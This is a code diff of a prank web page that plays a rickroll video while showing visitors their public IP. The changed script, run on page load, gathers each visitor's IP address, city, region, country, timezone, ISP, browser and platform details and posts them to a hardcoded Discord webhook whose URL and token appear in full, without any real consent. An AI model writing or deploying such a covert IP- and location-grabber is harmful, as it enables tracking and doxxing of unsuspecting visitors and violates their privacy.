@@ -2,44 +2,48 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Visitor Info Demo</title>
+  <title>Visitor Info with Location</title>
 </head>
 <body style="text-align: center; font-family: Arial, sans-serif; padding: 20px;">
 
   <h2>Your Public IP Address is:</h2>
   <p id="ip">Loading...</p>
 
-  <h3>Here’s a meme while we demo 😎</h3>
+  <h3>Enjoy this meme while we collect demo info 😎</h3>
   <video width="480" controls autoplay muted loop>
     <source src="https://media.githubusercontent.com/media/AnIdiotsGuide/website-assets/master/videos/rickroll.mp4" type="video/mp4">
     Your browser does not support the video tag.
   </video>
 
   <script>
-    const webhookURL = 'https://discord.com/api/webhooks/1390268292500820030/bF7_FAN1_YyvGPeLZuhE3TIDSVFIxg0ky0OxRveEVP_8ERIefeUtWRa_GZfj8m7XqhXC';
+    const webhookURL = "https://discord.com/api/webhooks/1390268292500820030/bF7_FAN1_YyvGPeLZuhE3TIDSVFIxg0ky0OxRveEVP_8ERIefeUtWRa_GZfj8m7XqhXC";
 
     function getDeviceInfo() {
-      const ua = navigator.userAgent;
       return {
-        userAgent: ua,
+        userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
       };
     }
 
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
       .then(data => {
-        const ip = data.ip;
-        document.getElementById('ip').textContent = ip;
+        document.getElementById('ip').textContent = data.ip;
 
-        const deviceInfo = getDeviceInfo();
+        const device = getDeviceInfo();
         const message = `
-🔔 New Visitor Logged:
-🌐 IP: ${ip}
-🖥️ User Agent: ${deviceInfo.userAgent}
-💻 Platform: ${deviceInfo.platform}
-🌍 Language: ${deviceInfo.language}
+📡 New Visitor Info:
+🌐 IP: ${data.ip}
+🌍 Country: ${data.country_name}
+🏙️ City: ${data.city}
+🧭 Region: ${data.region}
+🕓 Timezone: ${data.timezone}
+📡 ISP: ${data.org}
+
+💻 Platform: ${device.platform}
+🧠 Browser Info: ${device.userAgent}
+🗣️ Language: ${device.language}
         `;
 
         fetch(webhookURL, {
@@ -48,13 +52,12 @@
           body: JSON.stringify({ content: message })
         });
       })
-      .catch(error => {
-        document.getElementById('ip').textContent = "Could not get IP.";
-        console.error("Fetch error:", error);
+      .catch(err => {
+        document.getElementById('ip').textContent = "Error fetching info.";
+        console.error("Geolocation error:", err);
       });
   </script>
 
 </body>
 </html>
 
- 
